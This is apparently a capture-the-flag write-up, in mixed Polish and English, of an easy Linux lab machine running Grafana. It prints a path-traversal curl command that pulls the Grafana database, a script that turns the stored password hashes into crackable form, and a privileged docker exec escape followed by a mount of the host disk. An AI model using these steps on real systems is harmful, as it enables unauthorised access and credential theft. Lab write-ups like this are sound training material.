# Data
Linux, Easy, created by **xct**

![data_slide](https://github.com/user-attachments/assets/8ed6d7ac-e48d-448f-99ad-60ba3d96f1c4)

```
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
3000/tcp open  ppp?
```

oho aż zbyt typowo wygląda początek xd

content discovery
```
datasources             [Status: 302, Size: 24, Words: 2, Lines: 3, Duration: 36ms]
login                   [Status: 200, Size: 32882, Words: 2586, Lines: 300, Duration: 32ms]
metrics                 [Status: 200, Size: 42385, Words: 1642, Lines: 628, Duration: 37ms]
org                     [Status: 302, Size: 24, Words: 2, Lines: 3, Duration: 31ms]
public                  [Status: 302, Size: 31, Words: 2, Lines: 3, Duration: 31ms]
robots.txt              [Status: 200, Size: 26, Words: 3, Lines: 3, Duration: 33ms]
signup                  [Status: 200, Size: 32851, Words: 2586, Lines: 300, Duration: 33ms]
verify                  [Status: 200, Size: 32851, Words: 2586, Lines: 300, Duration: 34ms]
```

![{4325949D-9397-49EC-8550-89A4CDE33CB3}](https://github.com/user-attachments/assets/a74abcf2-e070-4e3a-89a0-8e13fcc60485)

![{B6E94D1D-577E-422A-9EB3-C6C731810E5F}](https://github.com/user-attachments/assets/c9775184-93cc-485e-a16f-dc4b8711dd64)

hmmm. W ehave 8.0.0 but.. lt's try

I run this

![{2FA140E1-69B7-41BF-8B56-3A64C2BE25C6}](https://github.com/user-attachments/assets/ff9b11c9-fedb-4f85-87f2-d50f7806da89)

a lot works

![{5142DE3C-4FB4-44A7-B54C-B7BF9BECC566}](https://github.com/user-attachments/assets/0006ae92-b254-4a00-b8cd-414ec197582c)

```
curl http://10.10.96.228:3000/public/plugins/alertlist/../../../../../../../../../../var/lib/grafana/grafana.db --path-as-is --output grafana.db
```
![{5056081C-FA4D-4345-B832-B2BA3DFA623D}](https://github.com/user-attachments/assets/5ee69d90-0e30-4e63-8007-4187ee509f2b)

Musimy sobie hash przekonwertować
```
import binascii
import base64

hashed_password_1 = '7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8'
salt_1 = 'YObSoLj55S'
decoded_pass_1 = bytes.fromhex(hashed_password_1)
b64_enc_hash_1 = base64.b64encode(decoded_pass_1).decode('utf-8')

hashed_password_2 = 'dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8'
salt_2 = 'LCBhdtJWjl'
decoded_pass_2 = bytes.fromhex(hashed_password_2)
b64_enc_hash_2 = base64.b64encode(decoded_pass_2).decode('utf-8')

hashed_salt_1 = base64.b64encode(salt_1.encode('utf-8')).decode('utf-8')
hashed_salt_2 = base64.b64encode(salt_2.encode('utf-8')).decode('utf-8')

print('sha256:10000:' + f'{hashed_salt_1}:' + b64_enc_hash_1)
print('sha256:10000:' + f'{hashed_salt_2}:' + b64_enc_hash_2)
```

![{7B0B19F5-D3C8-4FFB-9D43-85CF07488DAD}](https://github.com/user-attachments/assets/0dc04ae6-5559-4117-a7a5-2cbfbcf04f07)

~60 sek cracking on RTX3070Ti and I got one password

It works for ssh connection

![{ED502438-D16D-47E4-98DA-11CA2858DEDD}](https://github.com/user-attachments/assets/b85ff1da-ac92-4dab-951b-61b10ec9e4be)

priv esc taki obvius

![{6CDADA2E-E7D6-4B2E-B75E-56C029B7FFF4}](https://github.com/user-attachments/assets/b444cfb9-8c1e-481c-b92e-cb464f4adc35)

```
sudo /snap/bin/docker exec -it --privileged --user root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 /bin/bash
```
![{20F26597-8799-40FD-AC1F-E976BD7A0A2C}](https://github.com/user-attachments/assets/91f2554e-59e9-49e7-876b-764b51db51c8)

![{97352A05-9918-4B0F-8F78-020E9BB29B96}](https://github.com/user-attachments/assets/e0cc3f9a-6111-4c82-bae5-a0d1d8b6b21e)

```
mkdir -p /mnt/hola
mount /dev/xvda1 /mnt/hola
```

![{B755BFD1-2413-4F69-8163-44478C858369}](https://github.com/user-attachments/assets/770be480-1c85-4ffc-8568-25a6ed54f109)

